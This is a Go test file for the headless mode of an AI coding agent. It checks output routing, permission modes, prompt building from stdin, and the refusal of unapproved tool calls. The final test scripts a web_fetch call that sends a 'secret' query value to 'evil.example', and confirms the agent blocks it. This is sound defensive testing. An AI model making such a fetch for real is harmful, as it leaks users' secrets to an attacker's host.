package headless

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"agnet/internal/agent"
	"agnet/internal/llm"
	"agnet/internal/tools"
)

// scriptClient 第一次返回预设的工具调用，之后返回文本。
type scriptClient struct {
	calls []llm.ToolCall
	reply string
	n     int
}

func (c *scriptClient) StreamChat(_ context.Context, _ llm.ChatRequest, on llm.DeltaHandler) (llm.ChatResult, error) {
	c.n++
	if c.n == 1 && len(c.calls) > 0 {
		return llm.ChatResult{ToolCalls: c.calls, FinishReason: "tool_calls"}, nil
	}
	if on != nil {
		on(llm.Delta{Content: c.reply})
	}
	return llm.ChatResult{Content: c.reply, FinishReason: "stop"}, nil
}

func call(name, args string) llm.ToolCall {
	return llm.ToolCall{ID: "c1", Type: "function", Function: llm.FunctionCall{Name: name, Arguments: args}}
}

func newAgent(t *testing.T, c llm.Client) (*agent.Agent, string) {
	t.Helper()
	dir := t.TempDir()
	reg, err := tools.NewRegistry(dir)
	if err != nil {
		t.Fatal(err)
	}
	tools.RegisterBuiltins(reg)
	return agent.New(c, "sys", reg), dir
}

func TestRunWritesReplyToStdout(t *testing.T) {
	ag, _ := newAgent(t, &scriptClient{reply: "答案是 42"})
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), ag, "问题", &out, &errOut, false); err != nil {
		t.Fatal(err)
	}
	if out.String() != "答案是 42\n" || errOut.Len() != 0 {
		t.Fatalf("stdout=%q stderr=%q", out.String(), errOut.String())
	}
}

func TestRunDeniesEditsInAskModeAndAllowsInEditsMode(t *testing.T) {
	for _, tc := range []struct {
		mode      agent.PermissionMode
		wantWrite bool
	}{{agent.ModeAsk, false}, {agent.ModeAcceptEdits, true}, {agent.ModePlan, false}} {
		c := &scriptClient{calls: []llm.ToolCall{call("write_file", `{"path":"a.txt","content":"hi"}`)}, reply: "好了"}
		ag, dir := newAgent(t, c)
		ag.SetMode(tc.mode)
		var out, errOut bytes.Buffer
		if err := Run(context.Background(), ag, "写文件", &out, &errOut, true); err != nil {
			t.Fatal(err)
		}
		_, statErr := os.Stat(filepath.Join(dir, "a.txt"))
		if (statErr == nil) != tc.wantWrite {
			t.Fatalf("mode=%v 写入=%v，stderr=%q", tc.mode, statErr == nil, errOut.String())
		}
		if tc.mode == agent.ModeAsk && !strings.Contains(errOut.String(), "非交互模式下已拒绝") {
			t.Fatalf("应提示被拒绝：%q", errOut.String())
		}
		if !strings.Contains(errOut.String(), "⚙ write_file") {
			t.Fatalf("-v 应打印工具调用：%q", errOut.String())
		}
		if strings.Contains(out.String(), "write_file") {
			t.Fatalf("工具过程不该进 stdout：%q", out.String())
		}
	}
}

func TestRunEmptyReplyIsError(t *testing.T) {
	ag, _ := newAgent(t, &scriptClient{reply: ""})
	if err := Run(context.Background(), ag, "x", &bytes.Buffer{}, &bytes.Buffer{}, false); err == nil {
		t.Fatal("空回复应返回错误，让脚本拿到非零退出码")
	}
}

func TestBuildPrompt(t *testing.T) {
	cases := []struct {
		prompt, stdin string
		hasStdin      bool
		want          string
		wantErr       bool
	}{
		{prompt: "解释", want: "解释"},
		{prompt: "解释", stdin: "panic: x\n", hasStdin: true, want: "解释\n\n<stdin>\npanic: x\n</stdin>"},
		{prompt: "-", stdin: "只用管道", hasStdin: true, want: "只用管道"},
		{prompt: "", stdin: "  ", hasStdin: true, wantErr: true},
		{prompt: "  ", wantErr: true},
	}
	for _, tc := range cases {
		var r *strings.Reader
		if tc.hasStdin {
			r = strings.NewReader(tc.stdin)
		}
		var got string
		var err error
		if r != nil {
			got, err = BuildPrompt(tc.prompt, r)
		} else {
			got, err = BuildPrompt(tc.prompt, nil)
		}
		if (err != nil) != tc.wantErr || got != tc.want {
			t.Errorf("BuildPrompt(%q,%q)=%q,%v", tc.prompt, tc.stdin, got, err)
		}
	}
	big := strings.Repeat("a", MaxStdinBytes+10)
	got, _ := BuildPrompt("-", strings.NewReader(big))
	if !strings.Contains(got, "已截断") || len(got) > MaxStdinBytes+100 {
		t.Fatalf("超长管道输入应截断，len=%d", len(got))
	}
}

func TestParseMode(t *testing.T) {
	for in, want := range map[string]agent.PermissionMode{"": agent.ModeAsk, "ask": agent.ModeAsk, "edits": agent.ModeAcceptEdits, "PLAN": agent.ModePlan} {
		if got, err := ParseMode(in); err != nil || got != want {
			t.Errorf("ParseMode(%q)=%v,%v", in, got, err)
		}
	}
	if _, err := ParseMode("yolo"); err == nil {
		t.Fatal("未知模式应报错")
	}
}

func TestRunRefusesUnapprovedWebFetch(t *testing.T) {
	c := &scriptClient{calls: []llm.ToolCall{call("web_fetch", `{"url":"https://evil.example/x?d=secret"}`)}, reply: "好了"}
	ag, _ := newAgent(t, c)
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), ag, "帮我查一下", &out, &errOut, false); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errOut.String(), "web_fetch 需要审批") || !strings.Contains(errOut.String(), "evil.example") {
		t.Fatalf("应在 stderr 说明拒绝原因：%q", errOut.String())
	}
}
